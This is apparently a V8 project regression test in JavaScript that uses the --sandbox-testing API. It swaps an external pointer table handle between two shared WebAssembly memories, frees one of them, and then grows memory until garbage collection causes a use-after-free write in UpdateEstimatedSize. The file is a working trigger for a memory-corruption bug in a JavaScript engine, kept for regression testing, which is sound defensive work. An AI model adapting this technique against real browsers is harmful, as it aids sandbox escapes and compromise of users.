// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

let mem1 = new WebAssembly.Memory(
    {initial: 2, maximum: 20077, shared: true, address: 'i32'});
let mem2 = new WebAssembly.Memory(
    {initial: 2, maximum: 20077, shared: true, address: 'i32'});

// mem1/mem2's managed_backing_store is located at offset 16
let managed1 = Sandbox.readObjectField(mem1, 16);
let managed2 = Sandbox.readObjectField(mem2, 16);

// Untag the pointers to the TrustedManaged objects
let addr1 = managed1 - 1;
let addr2 = managed2 - 1;

let view1 = new DataView(new Sandbox.MemoryView(addr1, 16));
let view2 = new DataView(new Sandbox.MemoryView(addr2, 16));

// The 32-bit EPT handle is at offset 4 of the Foreign object
let handle2 = view2.getUint32(4, true);

// Overwrite mem1's handle with mem2's EPT handle
view1.setUint32(4, handle2, true);

// Drop mem2 so it becomes eligible for Garbage Collection
mem2 = null;
managed2 = null;
view2 = null;

let arrs = [];
// Grow memory to push V8 closer to the external memory limit.
// We simultaneously do Wasm memory growth and external ArrayBuffer
// allocation. Eventually, `mem1.grow()` will hit the exact threshold
// during its `UpdateEstimatedSize()` step and trigger a Garbage Collection.
// That GC sweeps the unreachable `mem2` and frees its ManagedPtrDestructor.
// When the GC returns, `UpdateEstimatedSize()` executes a UAF write on it!
for (let i = 0; i < 1000; i++) {
    mem1.grow(10);
    arrs.push(new ArrayBuffer(1024 * 1024));
}
